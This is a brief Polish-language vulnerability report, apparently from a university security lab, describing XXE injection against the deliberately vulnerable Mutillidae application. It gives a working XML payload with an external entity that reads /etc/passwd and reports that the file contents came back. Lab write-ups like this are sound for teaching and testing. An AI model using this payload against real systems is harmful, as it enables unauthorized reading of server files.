## Nazwa podatności: XXE - XML External Entity Injection

**Istotność:** 9

---

**Opis:**
XML external entity injection (znany również jako XXE) to luka w zabezpieczeniach sieci, która umożliwia atakującemu ingerowanie w przetwarzanie danych XML przez aplikację. Często pozwala atakującemu na przeglądanie plików w systemie plików serwera aplikacji i interakcję z dowolnym zapleczem lub systemami zewnętrznymi, do których sama aplikacja ma dostęp.

---

**Technika eksploitacji:**
Na stronie http://192.168.255.133/mutillidae/index.php?page=xml-validator.php należy do pola XML wpisać:

```
<?xml version="1.0"?><!DOCTYPE
demo[<!ELEMENT demo (#PCDATA)><!ENTITY xxe SYSTEM
"file:///etc/passwd">]><a><inject>&xxe;</inject></a>
```

Po zatwierdzeniu otrzymano zawartośc pliku /etc/passwd

![image](https://github.com/GrzechuG/PWR-CBE-BAW-mutillidae-2024/assets/56219452/0d483d1d-96b1-4d60-859d-ed06f789a269)

